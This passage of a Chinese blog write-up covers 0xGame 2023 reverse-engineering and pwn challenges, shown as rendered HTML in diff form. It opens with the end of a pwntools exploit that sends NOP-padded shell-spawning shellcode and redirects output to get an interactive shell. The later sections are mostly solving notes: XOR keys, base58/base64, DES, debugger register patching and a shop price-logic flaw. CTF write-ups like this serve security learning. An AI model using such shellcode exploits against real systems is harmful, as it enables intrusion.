class="hljs-built_in">print</span>(p.recv())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rl</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> p.recvuntil(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inter</span>() : p.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr</span>():<br>	<span class="hljs-keyword">return</span> u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>	<br>sla(<span class="hljs-string">&quot;code:&quot;</span>,asm(shellcraft.sh()).rjust(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&quot;\x90&quot;</span>))<br>sl(<span class="hljs-string">&quot;exec 1&gt;&amp;0&quot;</span>)<br>inter()<br></code></pre></td></tr></table></figure>
+
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1697008828382-f965ebec-e79e-4dc2-8b90-84fd7747cf1c.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<h1 id="Week2"><a href="#Week2" class="headerlink" title="Week2"></a>Week2</h1><h2 id="Re-1"><a href="#Re-1" class="headerlink" title="Re"></a>Re</h2><h3 id="符文解密师"><a href="#符文解密师" class="headerlink" title="符文解密师"></a>符文解密师</h3><p>shift+f12</p>
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696727110794-15708965-4f77-4f90-aade-780ee2d69836.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<h3 id="编译逆旅者"><a href="#编译逆旅者" class="headerlink" title="编译逆旅者"></a>编译逆旅者</h3><p>在线工具反编译</p>
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1697248475485-f08e76c6-4700-4791-9467-faaf94cb66ea.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>题目让我拿到真理的旗帜</p>
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1697248518303-ca15e248-d243-4824-8efb-8758dcb2f799.png" srcset="/img/loading.gif" lazyload class="" title="img">  
+
+<p>那就直接打印flag</p>
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1697251380345-9441b9dd-9600-42a2-a600-e2d3b50d28d0.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>还可以运行pyc，学到了</p>
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1697609883960-7e5c1387-cbba-450c-a27f-876b2480313d.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<h3 id="码海舵师"><a href="#码海舵师" class="headerlink" title="码海舵师"></a>码海舵师</h3><img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696729353037-09520dcb-87c0-466b-b8fe-4594750a99ee.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>base，密文后手传入</p>
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696729258453-f8f5227c-ebaf-4020-9e88-6c0a58d3eec5.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696729396381-1f9346f0-f161-4f05-a91a-feabb6328865.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<h3 id="注册侦探"><a href="#注册侦探" class="headerlink" title="注册侦探"></a>注册侦探</h3><p>运行发现没有输入，默认没注册</p>
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696731310261-315e3098-4409-4a2c-864e-ab82b449bc28.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>动调发现直接从第二个断点跳到63行</p>
+<p>第三个断点处是关键步骤</p>
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696731383544-1ff24caf-7b30-48f7-9720-deadf8439e45.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>把src（v3）提取出来</p>
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696731295765-5e5bfc56-d9ff-4956-83e7-79761a6828e9.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>一步异或即可</p>
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696731236233-3f07787b-d43b-401b-8823-cb3324e6744f.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+
+
+<p>另一种方法</p>
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1697612859250-585a0c6b-c779-4b21-8ab1-33e27b0f6b03.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>问gpt分析一下</p>
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1697612963416-526e5d07-0392-4fa7-87cb-1c7bccd47674.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>可以知道程序在检测注册表项的值HKEY_CURRENT_USER\Software\0xGame\registered</p>
+<p>如果为1则输出flag。这里我们直接创建这个注册表值并将其修改为1即可得到flag。</p>
+<p>问gpt如何新建注册表</p>
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1697612792030-610f1573-1ade-4e2f-806a-7f4ffa4c61ad.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1697612737357-1691bda6-95d5-4ade-8fbb-e4ad00542805.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1697612686687-d0b23846-404b-4913-8328-8018a6a3ef34.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<h3 id="壳艺大师"><a href="#壳艺大师" class="headerlink" title="壳艺大师"></a>壳艺大师</h3><img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696731913307-924f8f31-440d-4c45-a225-e0dc4c3afc85.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>查看字符串，看到有The0xGameKey就去看了一下</p>
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696732874453-9d096675-4df8-407a-b512-30e95a5a7cc9.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>这边还有两处，觉得没啥用</p>
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696732907425-a4a45237-fed7-4c2e-bf4c-611648a66095.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>OD调试发现绿色的指令是正确的字符串，要想办法goto LABEL5</p>
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696735357814-1d02ff75-a096-4c60-b65c-f6aa196515d5.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>伪c来看应该要去看63行的字符串，但无论IDA还是OD效果都不好</p>
+<p>这个应该是密文，且加密过程有一步异或</p>
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1697254076862-201bfad3-148a-478a-975b-066b4987a4a9.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>再做的时候想到前面的可能是密钥，结合异或就想着去试一下循环异或</p>
+<p>提取数据的时候要跟显示的相反，IDA在提取的时候已经帮我处理了，那就手动提一下</p>
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1697253541439-f08ead82-dc11-4269-9f8d-cccbd029d457.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>最后得到flag，好耶，ak第二周的re了</p>
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1697253878779-6bcf554d-3d61-4bd4-9d7c-c72c0f55b637.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+
+
+<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="ezshop"><a href="#ezshop" class="headerlink" title="ezshop"></a>ezshop</h3><img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696923079769-7f9588d0-3cbd-479f-9ea6-1aeae0c4306c.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696923419197-3ce1f7ec-55d0-4022-ade2-ed885361a7f0.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>一开始钱是1000</p>
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696924269838-1bab36e5-18a5-44ce-8847-215e1db6a9cf.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>nc一下看字符串</p>
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696923401368-ee42513f-ef25-4248-bf3c-1f6530209d45.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696923490251-38d8b78b-3aa1-4512-b29b-41c7dac12dd8.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>买得起变量加1，输入的v3将会作为数组的下标</p>
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696924165215-31e4ef97-7698-4861-992c-c98c058df515.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696923956609-f6030d55-dacd-48f6-8914-e71d5ea8e6e7.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>dword要等于1</p>
+<p>打印flag</p>
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696923934671-d3c09891-c35a-44fb-a99f-8348ae4a2ccb.png" srcset="/img/loading.gif" lazyload class="" title="img">‘
+
+<p>看内存我希望dword_40e0++，变成1，那么shopping_cart的下标要变成2，也就是第三个数据，那么v3希望是3减1后下标就是2</p>
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696924050841-cfd1a19c-4d0d-4624-a1ce-3a75b38c7611.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>只要买得起就行，零元购或者负数也行，这样能很快拿到flag</p>
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696934627928-018fd979-78ee-46e7-bdd3-22d5d1c69a57.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<h1 id="Week3"><a href="#Week3" class="headerlink" title="Week3"></a>Week3</h1><h2 id="Re-2"><a href="#Re-2" class="headerlink" title="Re"></a>Re</h2><h3 id="代码启示录"><a href="#代码启示录" class="headerlink" title="代码启示录"></a>代码启示录</h3><img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1697377387321-70a975f7-1f05-452a-8e80-2a64e7bb360b.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<h3 id="旋转密码城"><a href="#旋转密码城" class="headerlink" title="旋转密码城"></a>旋转密码城</h3><img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1697380005333-dd77e540-a2ed-488f-ace9-224a50efa4f1.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>写脚本的时候卡了一会，一个是range忘加了，还有一个是if循环一直在i循环的外面，导致一直没输出，还是靠printf调试出来的</p>
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1697379952083-eee425e8-6cb4-43cd-85ff-0f1eb56944dc.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+
+
+<p>更快的一种方法，看到caesarplus和47</p>
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1698146597397-fe9067ee-a9a6-46c1-b300-1583ba458650.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>\表示转义，去掉一个就行</p>
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1698146710687-c6b21d03-1d7a-4054-a7f9-310df1d7a896.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+
+
+<h3 id="数字幽灵城"><a href="#数字幽灵城" class="headerlink" title="数字幽灵城"></a>数字幽灵城</h3><p>提取storedFlag没用</p>
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1697619204803-b86248c8-54df-463b-aca5-77a482a15f59.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>base58的表</p>
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1697619294393-c6a91da7-27b8-4047-ba4a-788dd48e16cc.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1697630945215-f0a16a40-d18b-4d8b-a274-7798f539714a.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1697630915042-a2e15eb6-383b-42ac-ba53-1bbfddf3d405.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>😒😒</p>
+<p>还得是jadx</p>
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1698150238882-9e6c80cf-5430-4db5-b64d-d5cf7d9e3391.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>程序会从资源中获取编码后的 flag，然后进行 BASE58 解码</p>
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1698150300217-8d6dcaa7-77b6-4e6b-85d9-8d40e8f30608.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>和newstar week1的一道很像</p>
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1698150367621-d291c77e-3f51-4f2d-9fc8-d9093c074395.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>看了一下ida里是没有密文的</p>
+<h3 id="变量迷城"><a href="#变量迷城" class="headerlink" title="变量迷城"></a>变量迷城</h3><p>解方程得到x+0xGame得到key</p>
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1697632424160-1416ec79-1ae1-4e63-828b-18751a393e07.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>然后一步异或</p>
+<p>算x让gpt写gpt解不出来</p>
+<p>但数字114514可以爆破</p>
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1697632404168-3ccd7131-28ef-488f-bdc2-6aa275ae1cea.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+
+
+<p>算出来后也可以用cmd</p>
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1698151641533-4c3b4aa8-cd44-4ba6-8cea-8cd5f740d229.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<h3 id="虚构核心"><a href="#虚构核心" class="headerlink" title="虚构核心"></a>虚构核心</h3><p>前半部分是读入文件解密，后半部分是一次异或</p>
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1697639711284-8a8d9fa7-9a9f-43b3-95b3-1d6c3588f3e0.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>密文看不到，java的看密文方法还得学一下</p>
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1697632936024-1c3f4c10-901a-4411-ad18-ad895ee5bca9.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+
+
+<p>这里的decrypted.dex要去模拟器里找</p>
+<p>安装运行</p>
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1698292119627-10680211-af0b-4fa0-a811-3050b0e7678c.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>不能直接到根目录，要修改模拟器权限</p>
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1698239490727-a91f673a-c822-4150-8b99-9f7f9a496ac9.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>运行之后到根目录搜索，我用的是联想，因为有root权限</p>
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1698239588628-e987159e-72e8-418a-9c1c-a053f4035239.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>雷电的在这里</p>
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1698307497841-c34c77af-3aa3-45ab-b4c2-29eb941e1bcf.png" srcset="/img/loading.gif" lazyload class="" title="img"> 
+
+<p>根据路径去找到文件，复制到本地</p>
+<p><a target="_blank" rel="noopener" href="https://www.zhihu.com/question/440199381">https://www.zhihu.com/question/440199381</a></p>
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1698245661535-2a93691a-fdb6-4509-ac45-ff7237ad3b70.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>第一部分和第五部分都已知，中间三部分长度为4，在线解</p>
+<p><a target="_blank" rel="noopener" href="https://www.cmd5.com/">https://www.cmd5.com/</a></p>
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1698292450682-937677ba-b760-441b-989e-61a0e3bb0e35.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0xGame</span>&#123;f5bf50a3-<span class="hljs-number">9988</span>-<span class="hljs-number">61</span>ee-<span class="hljs-number">8</span>c00-f3eddaccb39f&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id=""><a href="#" class="headerlink" title=""></a></h3><h1 id="Week4"><a href="#Week4" class="headerlink" title="Week4"></a>Week4</h1><h2 id="Re-3"><a href="#Re-3" class="headerlink" title="Re"></a>Re</h2><h3 id="二进制学徒"><a href="#二进制学徒" class="headerlink" title="二进制学徒"></a>二进制学徒</h3><img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1697974990638-dc68376a-eeb9-41b5-9160-a376e0a0aa32.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<h3 id="代码悟道者"><a href="#代码悟道者" class="headerlink" title="代码悟道者"></a>代码悟道者</h3><p>一眼base64变表</p>
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1697975248489-747ce90b-a853-4b16-a011-b1b84166ba4f.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1697975236033-0c4eee0f-b191-4d84-8138-d5e0cdad07d5.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<h3 id="指令神使"><a href="#指令神使" class="headerlink" title="指令神使"></a>指令神使</h3><p>表面的flag</p>
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1697976398332-b9fc6ac0-6c43-4de7-ad76-afe74e4bf15c.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1697976410759-baacc2f4-ba33-4483-bb28-989d62751b07.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>直接看字串看不到</p>
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1697976371182-8a279bb1-be43-4b7f-b21f-bdba7bbb24f1.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>动调的时候才能看到真正的flag</p>
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1697976337904-bb9c82a9-3b1c-4945-8880-4758a6e768a7.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>动调的时候还发现，不管输什么第22行代码都要先执行一次再回去判断，估计是这个时候对程序做了修改</p>
+<p>在%26基础上加13，且最多是97+0x19，所以是rot13</p>
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1698919017891-0ee5cb50-8f01-49c1-a443-bf49dc09a3d7.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<h3 id="算法祭司"><a href="#算法祭司" class="headerlink" title="算法祭司"></a>算法祭司</h3><p>第一次看到linker info飘红的，看上去是用C#写的</p>
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1697976637477-3fb09947-4a17-4d28-99fc-43915dcadcee.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>ida不可编译</p>
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1697976749295-8697cfbf-4c4d-4884-8bc0-a9e7b25d0cf7.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>des</p>
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1698576647083-daaffb9d-9104-4b7b-9724-de6ba3a90a7f.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>问gpt说是原始key^0x66作为des的key，但是不知道为什么出不了</p>
+<p>官方用ILSpy打开找到main方法就是java，可以看出，程序从资源中拿到 encryptedKey 然后对其 xor 0x66，之后将其分别作为 DES 算法的 IV和 KEY ，将用户的输入加密后进行 base64 编码</p>
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1698937587781-de16f757-d178-4366-a334-a8c804f39c44.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>资源直接看，好像不能用引用的方式找到</p>
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1698937482393-f3b11dfb-71e4-4c93-863c-ed3f07a796a2.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1698937738379-7da68857-4d12-495f-9bdc-eed8d179285f.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<h3 id="内存星旅者"><a href="#内存星旅者" class="headerlink" title="内存星旅者"></a>内存星旅者</h3><p>没有输入直接结束，说明要修改参数之后才能运行</p>
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1698582010378-96cc68e1-f4be-4860-bac8-a2151f618bce.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+
+
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1699065872230-7a7fefdb-08f8-4efe-a1ad-441df75b2734.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1699065263226-038a89ae-f3d0-43c3-b817-a06afdb98176.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>v5的值是1897488的时候if返回值不为0</p>
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1699065906955-c62bbd9d-6f7d-4662-89e3-d3902106af72.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>call 判断函数之后一步是test，之后点击寄存器，右键将rax寄存器的值改为1，进入if函数</p>
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1699062760768-6451e4b2-e3cb-4008-9622-5a3153f90141.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>在删除文件前打断点运行程序到这里</p>
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1699065579850-efd62144-060c-4d59-8bda-28f304f683a5.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>v7是生成的文件路径，先生成temp文件，再一步异或，再删除文件</p>
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1699065612488-828f85d6-e7e4-44c2-918d-79974cad5ffb.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>文件路径中间空着的是我的中文名，所以可能显示不了</p>
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1699063863766-44b75a95-5d5e-43aa-95a4-8ffb5d69141a.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>得到flag</p>
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1699064501846-b41ac232-89b0-41fb-a2b1-bd91e1caf9e8.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-number">0</span>xGame&#123;t<span class="hljs-string">&quot;=v(r%ss&#125;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>师傅说显然不对，再看原来题目有bug</p>
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1699359763465-321c386d-ed8b-415b-9f0a-0c60efc4991b.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>前面有异或，再异或回去</p>
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1699360433403-3925a3d8-53fd-4fe8-84bd-6709a03faea6.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1699360477957-3c8c8adf-759e-4a5b-9614-61aad50cb7ac.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%AF%94%E8%B5%9Bwp/" class="category-chain-item">比赛wp</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>0xGame2023部分Reverse与Pwn</div>
+      <div>https://j1ya-22.github.io/2023/11/20/0xGame2023部分Reverse与Pwn/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>j1ya</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年11月20日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/11/26/Geek2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/" title="Geek2023部分Reverse与Pwn">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Geek2023部分Reverse与Pwn</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/11/13/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2023%E5%86%B3%E8%B5%9Bwp/" title="浙江省省赛2023决赛wp">
+                        <span class="hidden-mobile">浙江省省赛2023决赛wp</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
